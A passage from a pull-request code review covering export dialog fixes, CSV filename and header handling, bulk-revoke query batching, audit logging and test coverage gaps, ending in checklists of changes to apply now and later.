</Typography>
```

Tab is selectable, a small helper line below the tabs surfaces the reason via the existing `xlsx-export-coming-soon` key, and the export button is disabled when format is xlsx (already in place at `staff-invitations-export-dialog-controller.tsx:164`).

**Fix:** drop `disabled` from the XLSX `Tab` and add the `Typography` helper below the `Tabs`. The non-breaking-space (`' '`) keeps the layout stable when CSV/JSON is selected.

**Scope decision (in this PR):** align *all* export dialogs to the helper-text pattern in one go. 6 files need the fix:

1. `apps/front/src/routes/authed/staff/invitations/list/_parts/staff-invitations-export-dialog-controller.tsx` — this PR's dialog
2. `apps/front/src/routes/authed/staff/profiles/details/users/_parts/staff-profile-users-export-dialog-controller.tsx`
3. `apps/front/src/routes/authed/staff/profiles/list/_parts/staff-profiles-export-dialog-controller.tsx`
4. `apps/front/src/routes/authed/staff/tenant-users/details/_parts/tenant-user-companies-export-dialog-controller.tsx`
5. `apps/front/src/routes/authed/staff/tenants/details/invitations/_parts/tenant-invitations-export-dialog-controller.tsx`
6. `apps/front/src/routes/authed/staff/tenants/details/profiles/_parts/tenant-profiles-export-dialog-controller.tsx`

`staff-users-export-dialog-controller.tsx` is already on the target pattern — leave alone.

For each: drop `disabled` from the XLSX `Tab`, add the helper `Typography` after `Tabs`. The export button's `disabled={exportFormat === 'xlsx'}` is already in place across all dialogs.

### C4. Export dialog has no explicit `aria-labelledby`/`aria-describedby`

**File:** `staff-invitations-export-dialog-controller.tsx:103-109`. MUI infers some, but explicit IDs improve SR experience.

### C6. `732px` magic number

**File:** `new-staff-invitations-page.tsx:58` — `maxWidth: '732px'`. Add a layout token or named constant.

### C7. `FindStaffInvitationsArgs` positional vs sister object-init

**File:** `InvitationService.cs:28-34` (positional) vs `:20-26` (object-init). Bikeshed.

### C8. Local `hasNextPage` redefined

**File:** `staff-invitations-table.tsx:294`. Reference uses the hook value.

### C9. `dataTable` `useMemo` dep over-broad

**File:** `staff-invitations-table.tsx:296-298`. Dep is whole `invitationsQuery.data`, not `.data.data`.

### C10. Unknown backend status silently maps to `'pending'`

**File:** `staff-invitations-table.tsx:85-101`. Consider `'unknown'` + warning log.

### ~~C11. Naming `Status` (query) vs `Statuses` (args)~~ *(won't fix — user decision)*

`Status` is the URL query string (singular by wire contract); `Statuses` is the parsed set of enums (plural by type). Different shapes justify different names.

### ~~C12. `GetStatusesOrNull` naming~~ *(won't fix — user decision)*

Explicit `OrNull` suffix preferred for clarity at the call site.

### C14. CSV filename collisions — repo-wide

**Files (all 7 export dialogs):**

- `apps/front/src/routes/authed/staff/invitations/list/_parts/staff-invitations-export-dialog-controller.tsx` *(this PR)*
- `apps/front/src/routes/authed/staff/staff-users/list/_parts/staff-users-export-dialog-controller.tsx`
- `apps/front/src/routes/authed/staff/profiles/list/_parts/staff-profiles-export-dialog-controller.tsx`
- `apps/front/src/routes/authed/staff/profiles/details/users/_parts/staff-profile-users-export-dialog-controller.tsx`
- `apps/front/src/routes/authed/staff/tenants/details/invitations/_parts/tenant-invitations-export-dialog-controller.tsx`
- `apps/front/src/routes/authed/staff/tenants/details/profiles/_parts/tenant-profiles-export-dialog-controller.tsx`
- `apps/front/src/routes/authed/staff/tenant-users/details/_parts/tenant-user-companies-export-dialog-controller.tsx`

Same name every export → users overwrite previous downloads silently. Append a timestamp suffix (e.g. `staff-invitations-2026-05-09-1430.csv`). Centralize via a small helper in `apps/front/src/lib/export/download.ts` (e.g. `withTimestamp(baseName, ext)`).

**Apply:** **YES — repo-wide.**

---

## D. Test coverage gaps

- Find spec missing 6+ scenarios (see B8).
- Bulk-revoke spec missing 7+ scenarios (see B8).
- Frontend tests: still none, consistent with rest of repo.

---

## E. Recommendation gear

### Apply in this PR (small + correctness/contract)

- **A1 + A2** (single fix → regenerate client) ← **single highest-leverage action**
- **A3** (centralize CSV sanitizer in `escapeCsvCell`)
- **A4** (normalize status before query)
- **B2** (resetCursorPagination on URL→state sync effect)
- **B6** (lowercase allowlist + stable error message)
- **B7** (hide bulk-revoke MenuItem when no eligible rows)
- **B12** (`sortId` → `sort_id` in error message)
- **N1** (batched bulk-revoke service: 1 SELECT + 1 SaveChanges instead of N+N) ← *perf-critical*
- **N2** (batched audit logs via new `LogManyAsync` + try/catch — subsumes N3) ← *perf + robustness*
- **N4** (pass `requestedInvitationIds` to service)
- **N5** (split try/catch in bulk-revoke hook)
- **N6 repo-wide** (BULK_ACTION_MAX_COUNT shared constant + UI pre-validation across 7 bulk endpoints) ← *consistency*

### Punt to follow-up issues

- **B8** (full test coverage matrix — both find + bulk-revoke specs)
- **N9 / C1, C4, C6, C7, C8, C9, C10** (polish bundle — could be one issue; C2/C3/C14 promoted to apply-now)

---

## Quick checklist for the "apply now" set

- [ ] **A1**: `[FromQuery(Name = "status")]` on `FindStaffInvitations.cs:18`
- [ ] **A2**: `just build-api && just generate-client && just tsc-front` + commit artifacts
- [ ] **A3**: CSV cell sanitizer in `apps/front/src/lib/export/csv.ts` `escapeCsvCell`
- [ ] **A4**: Normalize status filter before passing to query + rewrite URL on mismatch
- [ ] **B2 repo-wide**: `resetCursorPagination?.()` in URL→state sync effect across **8 list-page tables**: staff-invitations *(this PR)*, staff-users (via use-staff-users-table-controller.impl.tsx), staff-profile-users-table, staff-profiles-table, tenant-users-table, tenant-invitations-table, tenant-user-companies-table, tenants-table.
- [ ] **B5 repo-wide**: Tighten every CSV-enum validator to reject mid-string empty tokens (`pending,,accepted` → 422). Same candidate set as B6.
- [ ] **B6 repo-wide**: This PR's `FindStaffInvitations.cs:48-70` *plus* repo-wide audit (`grep -rn "StringComparer.OrdinalIgnoreCase"` + `grep -rn 'WithMessage.*string.Join'` in `apps/api/Src/Modules/`). For every CSV-enum validator, migrate to canonical `nameof()` + lowercase-at-display pattern per `docs/guides/validator-conventions.md` Rule 8.
- [ ] **B7 repo-wide**: Hide disabled bulk `MenuItem` (Option A) across **3+ selection-actions**: staff-invitations *(this PR)*, staff-users-selection-actions, tenant-profiles-selection-actions; grep other `*-selection-actions.tsx` for the `Tooltip > Box span > MenuItem` pattern at impl time.
- [ ] **B12 repo-wide**: `sortId` → `sort_id` in error message across **11 Find handlers**: FindSystemNotices, FindAuditLogs, FindStaffInvitations *(this PR)*, FindInvitationsForTenantAsStaff, FindTenantsAsStaff, FindStaffProfiles, FindStaffProfileUsers, FindTenantProfilesAsStaff, FindStaffUser, FindTenantUserCompaniesForStaff, FindTenantUsersAsStaff.
- [ ] **C3**: Align all 6 export dialogs to the `staff-users-export-dialog-controller.tsx` helper-text pattern (selectable XLSX Tab + helper `Typography` showing `xlsx-export-coming-soon`). Files: staff-invitations, staff-profile-users, staff-profiles, tenant-user-companies, tenant-invitations, tenant-profiles export dialogs.
- [ ] **C2 repo-wide**: Translate CSV headers via `t(...)` in **all 7 export dialogs** using the same keys as the matching table column headers (staff-invitations *(this PR)*, staff-users, staff-profiles, staff-profile-users, tenant-invitations, tenant-profiles, tenant-user-companies).
- [ ] **C14 repo-wide**: Append timestamp suffix to CSV filenames in **all 7 export dialogs**. Centralize via `withTimestamp(baseName, ext)` in `apps/front/src/lib/export/download.ts`.
- [ ] **N1 repo-wide**: Convert every bulk service method using N×SELECT + N×SaveChanges to single batched query + single SaveChangesAsync. Candidates: BulkRevokeStaffInvitationsAsync *(this PR)*, BulkSuspendStaffUsersAsync, BulkReactivateStaffUsersAsync, BulkDeleteStaffUsersAsync, BulkDeleteStaffProfilesAsync, BulkDeleteTenantProfilesAsStaffAsync, the 2 bulk methods in TenantUserCompanyActionsForStaff. Watch for hidden per-item side-effects.
- [ ] **N2 repo-wide**: Add `LogManyAsync(IReadOnlyCollection<CreateAuditLogArgs>, CancellationToken)` to `IAuditLogService`; replace per-loop `LogAsync` calls in every bulk handler under `apps/api/Src/Modules/*/Handlers/Staff/Bulk*.cs` and `TenantUserCompanyActionsForStaff.cs` with one batched call wrapped in try/catch. Subsumes N3.
- [ ] **N4 repo-wide**: Pass `requestedInvitationIds` (distinct) to service across every bulk handler matching the same `Distinct() then non-distinct` pattern.
- [ ] **N5 repo-wide**: Split try/catch in every bulk-action hook so post-processing only runs on guaranteed-successful mutation. Confirmed: `use-staff-invitation-bulk-revoke.ts` *(this PR)*; audit other bulk hooks under `apps/front/src/routes/authed/staff/**` and inline hooks in `*-bulk-action-dialogs.tsx` / `*-selection-actions.tsx`.
- [ ] **N6 repo-wide**: Add `BULK_ACTION_MAX_COUNT = 100` to `packages/shared-ts/lib/constants.ts`. Wire UI pre-validation (disabled trigger + tooltip with i18n) across every bulk-action surface targeting an endpoint with `maxCount: 100`. Affected backend endpoints listed in N6 body. Frontend surfaces (known): `staff-invitations-selection-actions`, `staff-users-bulk-action-dialogs`, `tenant-user-companies-selection-actions`, `tenant-profiles-selection-actions`, plus the staff-profiles delete trigger (locate via hook). Add i18n key `bulk-action-max-count-exceeded` to en/fr.

## Quick checklist for the "follow-up issues" set

- [ ] **B5**: Tighten validator against mid-string empties (low value, optional)
- [ ] **B8**: Expand `FindStaffInvitations.Spec.cs` (6+ scenarios) + `BulkRevokeStaffInvitations.Spec.cs` (7+ scenarios)
- [ ] **N9 + C1, C2, C3, C4, C6, C7, C8, C9, C10, C14**: polish bundle — one issue
